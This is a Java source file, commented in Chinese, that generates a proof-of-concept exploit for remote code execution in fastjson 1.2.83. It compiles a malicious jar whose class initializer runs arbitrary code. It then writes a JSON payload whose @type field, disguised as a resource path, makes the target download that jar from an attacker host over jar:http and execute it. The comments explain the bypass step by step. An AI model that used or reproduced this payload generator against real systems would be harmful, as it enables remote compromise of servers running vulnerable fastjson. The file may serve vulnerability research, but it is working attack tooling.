package poc_1283;

import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import utils.CodeLoader;
import utils.JavassistGen;
import utils.PocIO;

import java.util.concurrent.Callable;

/**
 * 生成 fastjson 1.2.83 RCE 【一阶段 · jar:http 远程加载】的恶意 jar。
 *
 * 原理：@type 里的点号会被 replace('.','/') 转成 /，从而把类名伪装成资源路径：
 *   @type      = "jar:http:..<IP_INT>:<PORT>.<jarName>!.POC"
 *   → 资源路径  = jar:http://<IP_INT>:<PORT>/<jarName>!/POC.class
 *   → LaunchedURLClassLoader 下载该 jar → 读 POC.class → ASM 检测 @JSONType → jsonType=true
 *   → loadClass → <clinit> 执行
 *
 * 要执行的代码从 code_to_run.txt 读取（含 try-catch 包裹）。
 *
 * 使用：
 *   java -cp ... poc_1283.GenHttpProbe [--host H] [--port P] [--jar J]
 */
@Command(name = "GenHttpProbe", mixinStandardHelpOptions = true,
        description = "生成 fastjson 1.2.83 一阶段 jar:http 远程加载的恶意 jar（代码来自 code_to_run.txt）")
public class GenHttpProbe implements Callable<Integer> {

    @Option(names = "--host", defaultValue = "127.0.0.1",
            description = "攻击机 IP（payload 中自动转为整数，避免被 replace('.','/') 破坏）")
    String host;

    @Option(names = "--port", defaultValue = "11111", description = "攻击机 HTTP 端口")
    String port;

    @Option(names = "--jar", defaultValue = "probe", description = "jar 名（不含扩展名，默认 probe）")
    String jarName;

    @Override
    public Integer call() throws Exception {
        long ipInt = ipToInt(host);
        // 类的 internal name（/ 分隔），加载时与 @type 替换后匹配
        String internalName = "jar:http://" + ipInt + ":" + port + "/" + jarName + "!/POC";
        String payload = "{\"@type\":\"jar:http:.." + ipInt + ":" + port + "." + jarName + "!.POC\",\"x\":1}";

        // fastjson 1.x 需要 @JSONType 注解作为信任信号 → withJsonType=true
        byte[] classBytes = JavassistGen.generate(internalName, CodeLoader.loadBody(), true);

        // 产物统一放 poc/artifacts/1283/（从项目根目录运行）
        PocIO.writeJar("poc/artifacts/1283/" + jarName, "POC.class", classBytes);
        PocIO.writeText("poc/artifacts/1283/http-payload.txt", payload + System.lineSeparator());

        System.out.println("[+] jar written  : poc/artifacts/1283/" + jarName);
        System.out.println("[+] payload file : poc/artifacts/1283/http-payload.txt");
        System.out.println("[+] internalName : " + internalName);
        System.out.println("[+] payload      : " + payload);
        return 0;
    }

    /** IPv4 点分十进制 → 整数 */
    static long ipToInt(String ip) {
        String[] p = ip.split("\\.");
        return (Long.parseLong(p[0]) << 24)
             | (Long.parseLong(p[1]) << 16)
             | (Long.parseLong(p[2]) << 8)
             | Long.parseLong(p[3]);
    }

    public static void main(String[] args) {
        System.exit(new CommandLine(new GenHttpProbe()).execute(args));
    }
}
